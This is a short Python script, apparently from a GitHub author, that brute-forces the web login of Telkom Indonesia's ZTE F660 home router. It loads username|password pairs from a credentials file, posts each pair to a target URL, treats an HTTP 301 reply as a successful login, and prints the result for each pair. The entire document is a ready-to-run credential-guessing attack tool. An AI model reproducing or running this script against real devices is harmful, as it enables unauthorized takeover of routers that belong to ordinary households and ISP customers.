#!/usr/bin/python
print("""\
   _______ ___  ___
  / _/ __// _ \\/ _ \\ | f609-brute
 / _/ _ \\/ // /\\_, / | Telkom Indonesia's ZTE F660 Bruteforcer
/_/ \\___/\\___//___/  | https://github.com/p4kl0nc4t
""")
import requests, sys
if len(sys.argv) != 2:
	print("usage: {} <url>".format(sys.argv[0]))
	sys.exit()
def main():
	fn = "credentials.txt"
	file = open(fn)
	url = sys.argv[1]
	lines = 0
	for i in file.readlines(): lines += 1
	file.seek(0)
	print("[i] Loaded {} credentials from {}".format(lines, fn))
	for cred in file.readlines():
		if cred.rstrip() == "": continue
		cred = cred.rstrip().split("|")
		username = cred[0]
		password = cred[1]
		pdata = {'_lang': '', 'frashnum': '', 'action': 'login', 'Username': username, 'Password': password}
		success = False
		r = requests.post(url, data=pdata, allow_redirects=False)
		if r.status_code == 301:
			success = True
		if success == False:
			print("[!] fail -> username: {} | password: {}".format(username, password))
		else:
			print("[*] success -> username {} | password: {}".format(username, password))
if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print(": SIGINT detected! Exiting.")
		sys.exit()
	except Exception as e:
		print("[!] Exception: {}".format(str(e)))
		pass
